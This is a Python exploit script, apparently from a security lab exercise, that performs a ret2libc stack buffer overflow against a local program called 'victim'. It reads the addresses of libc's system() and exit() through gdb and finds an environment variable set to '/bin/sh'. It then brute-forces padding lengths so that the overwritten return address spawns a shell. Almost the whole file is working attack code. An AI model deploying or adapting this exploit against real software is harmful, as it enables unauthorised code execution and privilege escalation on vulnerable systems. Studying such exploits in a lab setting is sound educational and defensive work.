#!/usr/bin/env python3
from subprocess import call, check_output
import ctypes
import re

def toLittleEndianBytes(big_endian_string):
    """
        Accepts a string containing an address and returns a bytes object containing
        the address in little endian format.
        Ex: toLittleEndianBytes("aabbccdd") -> b"\xdd\xcc\xbb\xaa"

        Args:
            big_endian_string (string): Address you want to convert to little endian bytes
        Returns:
            Bytes object containing the address in little endian format
    """
    # Split string in groups of two characters, cast each group to its integer value (base 16)
    # then store them in hex_bytes as an array
    hex_bytes = [int(big_endian_string[i:i+2], 16) for i in range(0, len(big_endian_string), 2)]
    # Reverse the array (making it little endian) turn the whole array into a bytes object
    escaped_little_endian_bytes = bytes(reversed(hex_bytes))
    return escaped_little_endian_bytes


def getLibcAddr(target_path):
    """
        Uses gdb to grab the addresses of the system() and exit() libc functions
        then return them in little endian bytes format.

        Args:
            target_path (string): Path of the executable used to get the addresses
                                  HINT: If you don't have a target just pass in "/bin/sh"
                                        it will likely give give you the right addresses
        Returns: 
            Addresses of the libc functions system() and exit() as little endian bytes.
    """
    # Using gdb set a break point in at the main function, run then print the
    # system and exit functions out (this will contain their addresses)
    gdb = check_output(['gdb', target_path, '-batch', '-ex', 'break main', '-ex',
                        'run', '-ex', 'print system', '-ex', 'print exit'])
    # Use regex to grab all hex strings (there will be on for each
    # '-ex' command above), then print the relevant ones
    addresses = re.findall("0x[0-9a-fA-F]+", str(gdb))
    system = toLittleEndianBytes(addresses[2][2:])
    exit = toLittleEndianBytes(addresses[3][2:])
    return system, exit


def getEnvAddr(var_name, target_path):
    """
        Get the address of an already existing environment variable
        then return it in little endian bytes format.
        To create an environment variable use the command 'export':
        Ex. export SHELLY="   /bin/sh"

        Args:
            var_name (string): The name of wanted environment variable
            target (string): Path of the executable you are trying to exploit
        Returns:
            The located address of your environment variable as little endian bytes.
    """
    try: var_name = var_name.encode('ascii')
    except: pass
    # Load libc dynamic linked library
    libc = ctypes.CDLL("libc.so.6")
    get_env = libc.getenv
    # Assign return type of getenv libc function as void pointer
    get_env.restype = ctypes.c_void_p
    # Get the address of the passed in environment variable
    # Recall the program name effects the memory location of our env var, each extra letter
    # added, decreases the memory address by two bytes, this includes this program
    env_addr = get_env(var_name) + (len('./'+__file__) - len(target_path)) * 2
    big_endian_hex = "{:08x}".format(env_addr)
    return toLittleEndianBytes(big_endian_hex)

if __name__ == "__main__":
    target_path = "./victim"
    system_addr, exit_addr = getLibcAddr(target_path)
    env_addr = getEnvAddr("SHELLY", target_path)

    # Sequence of addresses used for the ret2libc exploit
    shellcode = system_addr + exit_addr + env_addr

    # Try multiple padding values to see if we can place our return address in the right place
    for padding_len in range(200, 220):
        # Create padding then append return address to create payload
        payload = (b'A' * padding_len) + shellcode
        # Execute our compiled C program
        call([target_path, payload])

